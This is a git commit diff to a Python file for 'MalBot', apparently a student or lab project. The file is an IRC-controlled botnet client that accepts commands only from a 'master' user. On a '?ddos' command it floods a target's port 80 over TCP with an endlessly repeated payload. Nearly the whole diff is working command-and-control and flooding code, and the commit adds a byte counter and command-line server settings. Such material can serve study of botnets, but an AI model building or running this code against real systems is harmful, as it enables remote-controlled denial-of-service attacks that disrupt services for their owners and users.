cd2abbe74599aa89450b01d5bdc7c25262fa77dc
Muhammad Arsala Khan Bangash <bangashm@dh2020pc08.utm.utoronto.ca>
2018-02-05 15:10:08 -0500

    Limited to master and added byte_count

--- bot.py
+++ bot.py
@@ -1,8 +1,8 @@
+
 import pydle
 import socket, sys
 
 
-# Simple echo bot.
 class MalBot(pydle.Client):
 
     def on_connect(self):
@@ -16,17 +16,30 @@ class MalBot(pydle.Client):
     def attack(self, target):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, 80))
+        print("Connection established")
+        payload = str.encode("I'm DDOSing your ass" * 420)
+        bytes_sent = 0
         while True:
-            s.send(str.encode("I'm DDOSing your ass"))
-            print(">> GET /" + target + " HTTP/1.1")
+            s.send(payload)
+            print("Bytes sent: {}".format(bytes_sent), end='\r')
+            bytes_sent += len(payload)
 
-    def on_message(self, source, target, message):
+    def on_message(self, channel, source, message):
+        if source != "master":
+            print("Ignoring message from non bot-master")
+            return
+
         if message.startswith("?ddos"):
             address = message.split()[1]
+            print("Acknowledged request to DDOS {}".format(address))
             self.message(self.channel, "Acknowledged request to DDOS {}".format(address))
             self.attack(address)
+        else:
+            print("Received message from master: {}, relaying it back to botmaster".format(message))
+            self.message(self.channel, message)
 
 
-client = MalBot('MalBot', realname='MalBot')
-client.connect('192.168.67.130', 6697, tls=False, tls_verify=False, password="botnet")
+client = MalBot(sys.argv[2], realname=sys.argv[2])
+client.connect(sys.argv[1], 6697, tls=False, tls_verify=False, password="botnet")
 client.handle_forever()
+
